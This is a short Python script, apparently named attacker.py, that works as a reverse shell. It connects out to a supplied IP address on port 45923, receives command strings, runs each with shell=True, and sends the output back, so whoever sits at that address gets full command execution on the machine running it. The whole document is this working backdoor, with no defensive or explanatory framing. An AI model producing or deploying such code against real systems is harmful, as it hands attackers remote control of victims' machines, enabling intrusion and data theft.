import socket
import subprocess
import sys

def run_attacker(ip_address):
    # Connect to the target computer
    target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        target_socket.connect((ip_address, 45923))  # Connect to the target
        print(f"Connected to target at {ip_address} on port 45923...")

        while True:
            # Wait for a command from the Flask app
            command = target_socket.recv(1024).decode('utf-8')
            if not command:
                break
            
            print(f"Received command: {command}")
            # Execute the command
            try:
                output = subprocess.check_output(command, shell=True, text=True)
                target_socket.sendall(output.encode('utf-8'))
            except subprocess.CalledProcessError as e:
                target_socket.sendall(e.output.encode('utf-8') + e.stderr.encode('utf-8'))

    except Exception as e:
        print(f"Error during connection: {e}")
    finally:
        target_socket.close()
        print("Connection closed.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python attacker.py <IP_ADDRESS>")
        sys.exit(1)

    ip_address = sys.argv[1]
    run_attacker(ip_address)
